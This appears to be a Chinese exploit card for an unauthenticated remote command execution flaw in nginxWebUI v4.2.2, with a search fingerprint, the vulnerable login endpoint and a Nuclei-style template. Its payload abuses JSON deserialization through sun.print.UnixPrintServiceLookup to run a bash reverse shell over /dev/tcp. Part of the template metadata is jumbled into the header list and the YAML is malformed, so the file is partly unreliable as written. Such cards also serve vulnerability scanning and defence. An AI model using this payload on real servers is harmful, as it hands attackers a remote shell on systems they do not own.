# nginxWebUI(v4.2.2)前台RCE

- **系统**：nginxWebUI(v4.2.2)前台　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="nginxWebUI"`
- **请求**：`POST /adminPage/login/getAuth HTTP/1.1`
- **关键头**：`Content-Length: 204`　`Content-Type: application/json;charset=UTF-8`　`id: nginxWebUI-rce`　`name: nginxWebUI Remote Command Execution (RCE)`　`author: X`　`severity: high`　`description: Detects remote command execution vulnerability in nginxWebUI.`

**请求体 / payload**
```
"name": {
"@type": "sun.print.UnixPrintServiceLookup",
"lpcFirstCom": [
";sh -i >& /dev/tcp/127.0.0.1/40069 0>&1;",
";sh -i >& /dev/tcp/127.0.0.1/40069 0>&1;"
]
- rce
- nginxWebUI
requests:
- method: POST
path:
- "{{BaseURL}}/adminPage/login/getAuth"
headers:
Content-Type: "application/json;charset=UTF-8"
body:
"name": {
"@type": "sun.print.UnixPrintServiceLookup",
"lpcFirstCom": [
";sh -i >& /dev/tcp/127.0.0.1/40069 0>&1;",
";sh -i >& /dev/tcp/127.0.0.1/40069 0>&1;"
]
matchers:
- type: status
status:
- 500
```
- **预期**：500　|　—